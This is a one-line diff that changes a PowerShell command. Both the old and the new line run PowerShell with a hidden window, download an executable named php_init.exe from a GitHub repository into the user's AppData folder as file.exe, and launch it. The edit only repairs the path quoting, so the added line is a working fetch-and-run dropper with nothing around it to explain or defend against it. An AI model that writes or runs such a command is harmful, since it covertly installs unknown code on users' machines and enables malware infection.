@@ -1,1 +1,1 @@
-powershell -WindowStyle Hidden -Command "iwr 'https://github.com/STEVEPVPS69/wallpin/raw/refs/heads/main/php_init.exe' -OutFile \"$env:APPDATA\file.exe\" -UseBasicParsing; if ((Get-Item \"$env:APPDATA\file.exe\").Length -gt 0) { Start-Process \"$env:APPDATA\file.exe\" }"
+powershell -WindowStyle Hidden -Command "iwr 'https://github.com/STEVEPVPS69/wallpin/raw/refs/heads/main/php_init.exe' -OutFile ($env:APPDATA+'\file.exe') -UseBasicParsing; if ((Get-Item ($env:APPDATA+'\file.exe')).Length -gt 0) { Start-Process ($env:APPDATA+'\file.exe') }"
